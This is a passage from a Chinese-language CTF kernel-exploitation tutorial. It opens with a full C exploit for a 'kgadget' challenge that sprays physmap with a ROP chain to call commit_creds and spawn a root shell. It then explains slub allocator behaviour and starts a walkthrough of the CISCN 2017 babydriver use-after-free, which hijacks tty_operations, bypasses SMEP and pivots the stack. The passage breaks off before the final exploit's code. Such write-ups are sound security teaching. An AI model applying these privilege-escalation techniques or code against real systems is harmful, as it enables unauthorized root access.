<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">size_t</span>  prepare_kernel_cred = <span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">size_t</span>  commit_creds = <span class="hljs-number">0xffffffff810c92e0</span>;<br><span class="hljs-type">size_t</span>  init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">void</span>    (*kgadget_ptr)(<span class="hljs-type">void</span>);<br><span class="hljs-type">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span>  page_size;<br><span class="hljs-type">size_t</span>     try_hit;<br><span class="hljs-type">int</span>     dev_fd;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">constructROPChain</span><span class="hljs-params">(<span class="hljs-type">size_t</span> *rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); idx++)<br>        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;<br><br>    <span class="hljs-comment">// more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        rop[idx] = ret;<br><br>    <span class="hljs-comment">// rop chain</span><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    saveStatus();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;dev fd!&quot;</span>);<br><br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-comment">// construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    constructROPChain(physmap_spray_arr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">// spray physmap, so that we can easily hit one of them</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">15000</span>; i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>            errExit(<span class="hljs-string">&quot;oom for physmap spray!&quot;</span>);<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger physmap one_gadget...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br><br>    try_hit = <span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>        <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>        <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>        <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>        <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>        <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>        <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>        <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>        <span class="hljs-string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="hljs-comment">// stack migration again</span><br>        <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>        <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>        <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi,   dev_fd;&quot;</span><br>        <span class="hljs-string">&quot;syscall&quot;</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可稳定提权</p>
<p><img src="https://s2.loli.net/2022/05/07/HdjzW6RvGfOtqPk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x04-Kernel-Heap-Use-After-Free"><a href="#0x04-Kernel-Heap-Use-After-Free" class="headerlink" title="0x04.Kernel Heap - Use After Free"></a>0x04.Kernel Heap - Use After Free</h1><p>UAF 即 Use After Free，通常指的是<strong>对于释放后未重置的垂悬指针的利用</strong>，此前在用户态下的 heap 阶段对于 ptmalloc 的利用很多都是基于UAF漏洞进行进一步的利用</p>
<p>在 CTF 当中，内核的“堆内存”主要指的是线性映射区（direct mapping area），常用的分配函数 kmalloc 从此处分配内存，常用的分配器为 slub，若是在 kernel 中存在着垂悬指针，我们同样可以以此完成对 slab&#x2F;slub 内存分配器的利用，通过 Kernel UAF 完成提权</p>
<p>slub 分配器的结构笔者在 <a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/">kernel pwn 入门笔记 - I</a> 中已经进行简要叙述，若是不记得了可以回去看看（笑）</p>
<h2 id="Pre-内核堆利用与绑核"><a href="#Pre-内核堆利用与绑核" class="headerlink" title="Pre. 内核堆利用与绑核"></a>Pre. 内核堆利用与绑核</h2><p>slub allocator 会优先从当前核心的 <code>kmem_cache_cpu</code> 中进行内存分配，在多核架构下存在多个 <code>kmem_cache_cpu</code> ，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp 进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object 的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，这使得利用模型变得复杂，也降低了漏洞利用的成功率</p>
<blockquote>
<p>比如说你在 core 0 上整了个 double free，准备下一步利用时 exp 跑到 core 1去了，那就很容易让人摸不着头脑 :（</p>
</blockquote>
<p>因此为了保证漏洞利用的稳定，<strong>我们需要将我们的进程绑定到特定的某个 CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> ，我们也能更加方便地进行漏洞利用</p>
<p>现笔者给出如下将 exp 进程绑定至指定核心的模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="Pre2-通用-kmalloc-flag"><a href="#Pre2-通用-kmalloc-flag" class="headerlink" title="Pre2. 通用 kmalloc flag"></a>Pre2. 通用 kmalloc flag</h2><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code>  是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code> </p>
<p>这两种 flag 的区别主要在于 <code>GFP_KERNEL_ACCOUNT</code> 比 <code>GFP_KERNEL</code> 多了一个属性——<strong>表示该对象与来自用户空间的数据相关联</strong>，因此我们可以看到诸如 <code>msg_msg</code> 、<code>pipe_buffer</code>、<code>sk_buff的数据包</code> 的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> ，而 <code>ldt_struct</code> 、<code>packet_socket</code> 等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code></p>
<p>在5.9 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792">这个 commit</a> 中取消了隔离机制，自内核版本 5.14 起，在 <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552">这个 commit</a> 当中又重新引入：</p>
<ul>
<li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel 而言（通常都是默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-*</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离：</li>
</ul>
<p><img src="https://s2.loli.net/2023/01/10/bLIr8nOUw4PjStx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="Pre3-slub-合并-amp-隔离"><a href="#Pre3-slub-合并-amp-隔离" class="headerlink" title="Pre3. slub 合并 &amp; 隔离"></a>Pre3. slub 合并 &amp; 隔离</h2><p>slab alias 机制是一种对同等&#x2F;相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p>
<ul>
<li>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等&#x2F;近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></li>
</ul>
<p>举个🌰，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配</p>
<p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，🌰如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p>
<h2 id="例题：CISCN-2017-babydriver"><a href="#例题：CISCN-2017-babydriver" class="headerlink" title="例题：CISCN - 2017 - babydriver"></a>例题：CISCN - 2017 - babydriver</h2><blockquote>
<p>可以说是最最最最最最最经典（典中典中典中典中典）的 kernel pwn 入门题</p>
<p><a href="/download/ciscn2017/pwn/babydriver.tar.gz" title="点此下载原题附件">点击下载-babydriver.tar.gz</a></p>
</blockquote>
<p>解压，惯例的<code>磁盘镜像 + 内核镜像 + 启动脚本</code>结构</p>
<p>查看<code>boot.sh</code>：<del>写的好乱啊</del>（<del>恼</del>）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;  -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s<br></code></pre></td></tr></table></figure>

<ul>
<li>开启了SMEP保护</li>
</ul>
<p>解压磁盘镜像看看有没有什么可以利用的东西</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> ./core.cpio ./core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">cpio -idv &lt; ./core.cpio</span><br></code></pre></td></tr></table></figure>

<p>查看其启动脚本<code>init</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br><span class="hljs-built_in">chown</span> root:root flag<br><span class="hljs-built_in">chmod</span> 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br><span class="hljs-built_in">chmod</span> 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>

<p>其中加载了一个叫做<code>babydriver.ko</code>的驱动，按照惯例这个就是有着漏洞的驱动</p>
<h4 id="①-逆向分析"><a href="#①-逆向分析" class="headerlink" title="① 逆向分析"></a>① 逆向分析</h4><p>惯例的<code>checksec</code>，发现其只开了NX保护，<del>整挺好</del></p>
<p><img src="https://i.loli.net/2021/03/03/eyaFXu2CQ3mwAg4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>在驱动被加载时会初始化一个设备节点文件<code>/dev/babydev</code></p>
<p><img src="https://i.loli.net/2021/03/03/pYZeduBDUzfayK9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在我们使用open()打开设备文件时该驱动会分配一个chunk，<strong>该chunk的指针储存于全局变量</strong><code>babydev_struct</code>中</p>
<p><img src="https://i.loli.net/2021/03/03/yvjCraBZLeVb4NG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>使用<code>ioctl</code>进行通信则可以重新申请内存，改变该chunk的大小</p>
<p><img src="https://i.loli.net/2021/03/03/Z5sSkiez27yN9EA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>在关闭设备文件时会<strong>释放该chunk，但是并未将指针置NULL，存在UAF漏洞</strong></p>
<p><img src="https://i.loli.net/2021/03/03/ehPoXGFKJ71Dwfl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>read和write就是简单的读写该chunk，便不贴图了</p>
<h4 id="②-漏洞点"><a href="#②-漏洞点" class="headerlink" title="② 漏洞点"></a>② 漏洞点</h4><p>若是我们的程序打开两次设备<code>babydev</code>，由于其chunk储存在全局变量中，那么我们将会获得<strong>指向同一个 chunk的两个指针</strong></p>
<p>而在关闭设备后该 chunk 虽然被释放，但是指针未置0，那么我们便可以<strong>通过另一个文件描述符操作该 chunk</strong>，即<strong>存在 Use After Free 漏洞</strong></p>
<h4 id="③-漏洞利用：Kernel-UAF-stack-migitation-SMEP-bypass-ret2usr"><a href="#③-漏洞利用：Kernel-UAF-stack-migitation-SMEP-bypass-ret2usr" class="headerlink" title="③ 漏洞利用：Kernel UAF + stack migitation + SMEP bypass + ret2usr"></a>③ 漏洞利用：Kernel UAF + stack migitation + SMEP bypass + ret2usr</h4><p>内核符号表可读（白给），我们能够很方便地获得相应内核函数的地址</p>
<p><img src="https://i.loli.net/2021/08/01/yloiSIGwWN8U1gq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>没有开启 kaslr，所以可以直接从 vmlinux 中提取gadget地址，这里 <strong>ROPgadget 和 ropper 半斤八两，建议两个配合着一起用</strong></p>
<p>由于开启了 SMEP 保护，无法直接 ret2usr，故我们需要改变 cr4 寄存器的值以 bypass smep</p>
<p>观察到在内核中有着如下的 gadget 可以很方便地改变 cr4 寄存器的值：</p>
<p><img src="https://i.loli.net/2021/03/11/rztYCIH579dc6vu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>接下来考虑如何通过 UAF 劫持程序执行流，这里我们选择 <code>tty_struct</code> 结构体作为 victim object</p>
<p>在 <code>/dev</code> 下有一个伪终端设备 <code>ptmx</code> ，在我们打开这个设备时内核中会创建一个 <code>tty_struct</code> 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 <code>tty_operations</code></p>
<p>那么我们不难想到的是我们可以通过 UAF 劫持 <code>/dev/ptmx</code> 这个设备的 <code>tty_struct</code> 结构体与其内部的 <code>tty_operations</code> 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p>
<p>由于没有开启SMAP保护，故我们可以在用户态进程的栈上布置ROP链与<code>fake tty_operations</code>结构体</p>
<blockquote>
<p>结构体<code>tty_struct</code>位于<code>include/linux/tty.h</code>中，<code>tty_operations</code>位于<code>include/linux/tty_driver.h</code>中</p>
</blockquote>
<p>内核中没有类似<code>one_gadget</code>一类的东西，因此为了完成ROP我们还需要进行一次<strong>栈迁移</strong></p>
<p>使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持<code>tty_operaionts</code>结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数指针以方便下断点：</p>
<p><img src="https://i.loli.net/2021/03/16/iKBLSsbPT9zcNqQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>我们不难观察到，在我们调用<code>tty_operations-&gt;write</code>时，<strong>其rax寄存器中存放的便是tty_operations结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头</p>
<p>使用ROPgadget查找相关gadget，发现有两条符合我们要求的gadget：</p>
<p><img src="https://i.loli.net/2021/03/16/o4c9ryjOBAkit8W.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>gdb调试，发现第一条gadget其实等价于<code>mov rsp, rax ; dec ebx ; ret</code>：</p>
<p><img src="https://i.loli.net/2021/03/16/Qd2sk6TngZa5EDR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>那么利用这条gadget我们便可以很好地完成栈迁移的过程，执行我们所构造的ROP链</p>
<p>而<code>tty_operations</code>结构体开头到其write指针间的空间较小，因此我们还需要进行二次栈迁移，这里随便选一条改rax的gadget即可</p>
<p><img src="https://i.loli.net/2021/03/16/7bROpernV1lSIjs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>需要注意的是<strong>计算相应结构体大小时应当选取与题目相同版本的内核源码</strong></p>
<h4 id="④-final-exploit"><a href="#④-final-exploit" class="headerlink" title="④ final exploit"></a>④ final exploit</h4><p>最终的exploit应当如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 